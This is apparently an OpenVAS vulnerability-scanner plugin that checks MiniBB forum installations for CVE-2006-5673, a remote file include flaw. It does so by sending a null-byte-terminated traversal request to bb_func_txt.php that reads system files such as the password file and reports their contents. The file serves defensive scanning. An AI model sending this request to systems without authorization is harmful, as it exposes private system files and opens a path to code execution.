###############################################################################
# OpenVAS Vulnerability Test
# $Id: minibb_rfi.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# MiniBB PathToFiles Parameter Remote File Include Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2008 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80071");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-5673");
  script_bugtraq_id(20757);
  script_name("MiniBB PathToFiles Parameter Remote File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2008 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/2655");

  script_tag(name:"solution", value:"Update to version 2.0.2a or later.");

  script_tag(name:"summary", value:"The remote web server is running MiniBB, an open source forum software
  which is is affected by a remote file include issue.");

  script_tag(name:"insight", value:"The version of MiniBB installed on the remote host fails to sanitize input to
  the 'pathToFiles' parameter before using it in the 'bb_func_txt.php' script.");

  script_tag(name:"impact", value:"Provided PHP's 'register_globals' setting is enabled, an unauthenticated
  attacker can exploit this issue to view arbitrary files and execute arbitrarycode, possibly taken from
  third-party hosts, on the remote host.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

files = traversal_files();

foreach dir(make_list_unique("/minibb", "/mini", "/blog", "/forum", cgi_dirs(port:port))) {

  install = dir;
  if (dir == "/") dir = "";

  foreach pattern(keys(files)) {

    file = "/" + files[pattern];

    url = string(dir, "/bb_func_txt.php?pathToFiles=", file, "%00");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) continue;

    if (egrep(pattern:pattern, string:res) ||
        string("main(", file, "\\0bb_codes.php): failed to open stream") >< res ||
        string("main(", file, "): failed to open stream: No such file") >< res ||
        "open_basedir restriction in effect. File(" >< res) {

      passwd = "";
      if (egrep(pattern:pattern, string:res)) {
        passwd = res;
        if ("<br" >< passwd) passwd = passwd - strstr(passwd, "<br");
      }

      if (passwd) {
        info = string("The version of MiniBB installed in directory '", install, "'\n",
          "is vulnerable to this issue. Here is the contents of " + file + "\n",
          "from the remote host :\n\n", passwd);
      }
      else info = "";

      security_message(data:info, port:port);
      exit(0);
    }
  }
}

exit( 99 );